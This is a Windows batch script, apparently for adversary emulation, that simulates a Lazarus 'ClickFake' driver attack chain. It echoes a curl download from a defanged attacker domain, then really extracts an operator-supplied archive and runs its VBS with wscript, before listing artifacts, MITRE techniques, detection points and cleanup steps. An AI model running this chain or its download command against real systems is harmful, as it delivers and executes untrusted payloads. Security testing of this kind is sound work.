@echo off
REM BYOVD Attack Chain Execution Script
REM Simulates the complete Lazarus Group ClickFake attack chain
REM Command: curl -> PowerShell -> VBS execution
REM WARNING: For authorized security testing only!

echo.
echo ======================================================================
echo BYOVD Attack Chain Simulation - Lazarus Group ClickFake Campaign
echo ======================================================================
echo WARNING: This simulates a real attack chain for security testing
echo Only run in authorized test environments!
echo.

REM Set variables
set TEMP_DIR=%TEMP%
set PACKAGE_NAME=nvidiadrivers.zip
set EXTRACT_DIR=%TEMP_DIR%\nvidiadrivers
set VBS_SCRIPT=%EXTRACT_DIR%\nvidiadrivers\install.vbs
set LOG_FILE=%TEMP_DIR%\byovd_attack_simulation_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%%time:~6,2%.log

REM Create log file
echo [%date% %time%] BYOVD Attack Chain Simulation Started > "%LOG_FILE%"
echo [%date% %time%] Target: %COMPUTERNAME% - User: %USERNAME% >> "%LOG_FILE%"
echo [%date% %time%] Simulating: Lazarus Group ClickFake campaign >> "%LOG_FILE%"

echo Starting BYOVD attack chain simulation...
echo Log file: %LOG_FILE%
echo.

REM Stage 1: Simulate malicious download
echo [STAGE 1] Simulating malicious driver download...
echo [%date% %time%] Stage 1: Download simulation started >> "%LOG_FILE%"

REM Original command being simulated:
echo Simulating: curl -k -o "%TEMP_DIR%\%PACKAGE_NAME%" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update
echo [%date% %time%] Simulated command: curl -k -o "%TEMP_DIR%\%PACKAGE_NAME%" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update >> "%LOG_FILE%"

REM Check if package exists (must be provided by operator)
if not exist "%PACKAGE_NAME%" (
    echo ERROR: nvidiadrivers.zip package not found in current directory!
    echo [%date% %time%] ERROR: Package not found in current directory >> "%LOG_FILE%"
    echo.
    echo To run this simulation:
    echo 1. Copy nvidiadrivers.zip to the same directory as this script
    echo 2. Run this script from that directory
    echo 3. Ensure you have administrative privileges for full simulation
    echo.
    pause
    exit /b 1
)

REM Copy package to temp (simulating download)
copy "%PACKAGE_NAME%" "%TEMP_DIR%\%PACKAGE_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Failed to copy package to temp directory
    echo [%date% %time%] ERROR: Failed to copy package to temp >> "%LOG_FILE%"
    pause
    exit /b 1
)

echo ✓ Package 'downloaded' to: %TEMP_DIR%\%PACKAGE_NAME%
echo [%date% %time%] Package copied to temp directory successfully >> "%LOG_FILE%"

REM Stage 2: PowerShell archive extraction
echo.
echo [STAGE 2] PowerShell archive extraction...
echo [%date% %time%] Stage 2: Archive extraction started >> "%LOG_FILE%"

REM Original command being executed:
echo Executing: powershell -Command "Expand-Archive -Force -Path '%TEMP_DIR%\%PACKAGE_NAME%' -DestinationPath '%EXTRACT_DIR%'"
echo [%date% %time%] Executing PowerShell archive extraction >> "%LOG_FILE%"

powershell -Command "Expand-Archive -Force -Path '%TEMP_DIR%\%PACKAGE_NAME%' -DestinationPath '%EXTRACT_DIR%'"

if %errorlevel% neq 0 (
    echo ERROR: Archive extraction failed
    echo [%date% %time%] ERROR: Archive extraction failed >> "%LOG_FILE%"
    pause
    exit /b 1
)

echo ✓ Archive extracted to: %EXTRACT_DIR%
echo [%date% %time%] Archive extracted successfully >> "%LOG_FILE%"

REM Verify extraction
if not exist "%EXTRACT_DIR%" (
    echo ERROR: Extraction directory not found
    echo [%date% %time%] ERROR: Extraction directory not found >> "%LOG_FILE%"
    pause
    exit /b 1
)

echo Package contents:
dir "%EXTRACT_DIR%" /b
echo [%date% %time%] Package contents listed >> "%LOG_FILE%"

REM Stage 3: VBS script execution
echo.
echo [STAGE 3] VBS script execution...
echo [%date% %time%] Stage 3: VBS execution started >> "%LOG_FILE%"

REM Check if main VBS script exists
if not exist "%VBS_SCRIPT%" (
    echo WARNING: install.vbs not found, checking for alternatives...
    echo [%date% %time%] WARNING: install.vbs not found >> "%LOG_FILE%"
    
    REM Try alternative VBS scripts
    if exist "%EXTRACT_DIR%\update.vbs" (
        set VBS_SCRIPT=%EXTRACT_DIR%\update.vbs
        echo Found alternative: update.vbs
        echo [%date% %time%] Using alternative: update.vbs >> "%LOG_FILE%"
    ) else if exist "%EXTRACT_DIR%\driver_loader.vbs" (
        set VBS_SCRIPT=%EXTRACT_DIR%\driver_loader.vbs
        echo Found alternative: driver_loader.vbs
        echo [%date% %time%] Using alternative: driver_loader.vbs >> "%LOG_FILE%"
    ) else (
        echo ERROR: No VBS scripts found in package
        echo [%date% %time%] ERROR: No VBS scripts found >> "%LOG_FILE%"
        pause
        exit /b 1
    )
)

REM Original command being executed:
echo Executing: wscript "%VBS_SCRIPT%"
echo [%date% %time%] Executing VBS script: %VBS_SCRIPT% >> "%LOG_FILE%"

REM Execute the VBS script
wscript "%VBS_SCRIPT%"

echo [%date% %time%] VBS script execution completed >> "%LOG_FILE%"

REM Stage 4: Verification and analysis
echo.
echo [STAGE 4] Post-execution analysis...
echo [%date% %time%] Stage 4: Post-execution analysis started >> "%LOG_FILE%"

echo Checking for execution artifacts...

REM Check for log files
echo Looking for generated log files:
if exist "%TEMP_DIR%\nvidia_*.log" (
    dir "%TEMP_DIR%\nvidia_*.log" /b
    echo [%date% %time%] NVIDIA log files found >> "%LOG_FILE%"
) else (
    echo No NVIDIA log files found
)

if exist "%TEMP_DIR%\byovd_*.log" (
    dir "%TEMP_DIR%\byovd_*.log" /b
    echo [%date% %time%] BYOVD log files found >> "%LOG_FILE%"
) else (
    echo No BYOVD log files found
)

if exist "%TEMP_DIR%\vbs_*.log" (
    dir "%TEMP_DIR%\vbs_*.log" /b
    echo [%date% %time%] VBS log files found >> "%LOG_FILE%"
) else (
    echo No VBS log files found
)

REM Check for artifact files
echo.
echo Looking for artifact files:
if exist "%TEMP_DIR%\*nvidia*.txt" (
    dir "%TEMP_DIR%\*nvidia*.txt" /b
    echo [%date% %time%] NVIDIA artifact files found >> "%LOG_FILE%"
) else (
    echo No NVIDIA artifact files found
)

if exist "%TEMP_DIR%\*byovd*.txt" (
    dir "%TEMP_DIR%\*byovd*.txt" /b
    echo [%date% %time%] BYOVD artifact files found >> "%LOG_FILE%"
) else (
    echo No BYOVD artifact files found
)

REM Check registry entries (requires elevated privileges)
echo.
echo Checking for registry artifacts:
reg query "HKCU\Software\BYOVDNVIDIATest" >nul 2>&1
if %errorlevel% equ 0 (
    echo ✓ BYOVD registry entries found
    echo [%date% %time%] BYOVD registry entries detected >> "%LOG_FILE%"
    reg query "HKCU\Software\BYOVDNVIDIATest" >> "%LOG_FILE%" 2>&1
) else (
    echo No BYOVD registry entries found
)

reg query "HKCU\Software\VBSBYOVDTest" >nul 2>&1
if %errorlevel% equ 0 (
    echo ✓ VBS BYOVD registry entries found
    echo [%date% %time%] VBS BYOVD registry entries detected >> "%LOG_FILE%"
    reg query "HKCU\Software\VBSBYOVDTest" >> "%LOG_FILE%" 2>&1
) else (
    echo No VBS BYOVD registry entries found
)

REM Check for services (requires administrative privileges)
echo.
echo Checking for test services:
sc query | findstr /i "BYOVD\|Test.*Driver\|NVIDIA.*Eth" >nul 2>&1
if %errorlevel% equ 0 (
    echo ✓ Test services may be present
    echo [%date% %time%] Test services detected >> "%LOG_FILE%"
    sc query | findstr /i "BYOVD\|Test.*Driver\|NVIDIA.*Eth" >> "%LOG_FILE%" 2>&1
) else (
    echo No test services found
)

echo.
echo ======================================================================
echo BYOVD ATTACK CHAIN SIMULATION COMPLETED
echo ======================================================================
echo [%date% %time%] Attack chain simulation completed >> "%LOG_FILE%"

echo.
echo SIMULATION SUMMARY:
echo ==================
echo Attack Type: BYOVD (Bring Your Own Vulnerable Driver)
echo Campaign: Lazarus Group ClickFake simulation
echo Execution Chain: curl ^-^> PowerShell ^-^> VBS ^-^> Driver loading
echo Target System: %COMPUTERNAME%
echo User Context: %USERNAME%
echo Completion Time: %date% %time%

echo.
echo MITRE ATT^&CK TECHNIQUES DEMONSTRATED:
echo T1566.002 - Phishing: Spearphishing Link
echo T1105     - Ingress Tool Transfer
echo T1059.001 - Command and Scripting Interpreter: PowerShell
echo T1059.005 - Command and Scripting Interpreter: Visual Basic
echo T1068     - Exploitation for Privilege Escalation
echo T1562.001 - Impair Defenses: Disable or Modify Tools
echo T1547.006 - Boot or Logon Autostart Execution: Kernel Modules

echo.
echo DETECTION OPPORTUNITIES:
echo - File creation: %TEMP_DIR%\nvidiadrivers.zip
echo - Archive extraction: %EXTRACT_DIR%\
echo - VBS execution: wscript.exe %VBS_SCRIPT%
echo - Registry modifications: HKCU\Software\BYOVD*
echo - Service creation attempts (if admin privileges)
echo - Log file generation: Multiple *.log files

echo.
echo GENERATED ARTIFACTS:
echo - Main log: %LOG_FILE%
echo - Extracted package: %EXTRACT_DIR%\
echo - VBS execution logs: %TEMP_DIR%\*vbs*.log
echo - Installation summaries: %TEMP_DIR%\*nvidia*.txt
echo - IOC files: %TEMP_DIR%\*ioc*.txt

echo.
echo CLEANUP INSTRUCTIONS:
echo To clean up this simulation:
echo 1. Delete: %EXTRACT_DIR%
echo 2. Delete: %TEMP_DIR%\nvidiadrivers.zip
echo 3. Delete: %TEMP_DIR%\*byovd*.* and %TEMP_DIR%\*nvidia*.*
echo 4. Remove registry keys: HKCU\Software\BYOVD*
echo 5. Stop/delete any test services created
echo.
echo Or run: powershell -File "%~dp0tools\cleanup_verifier.ps1" -RemoveFoundArtifacts

echo.
echo Log file saved: %LOG_FILE%
echo.
echo IMPORTANT: This was a simulation for security testing purposes.
echo Review generated artifacts and logs for blue team analysis.
echo.

REM Optional: Open log file
set /p OPEN_LOG="Open log file? (y/n): "
if /i "%OPEN_LOG%"=="y" (
    notepad "%LOG_FILE%"
)

REM Optional: Keep window open
echo.
pause